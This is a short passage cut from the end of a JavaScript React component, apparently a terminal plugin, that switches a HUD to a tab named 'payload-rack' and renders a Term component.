          recon.hud.setActiveTab('payload-rack');
        }
      }
    }

    render() {
      return React.createElement(Term, this.props);
    }
  };
};
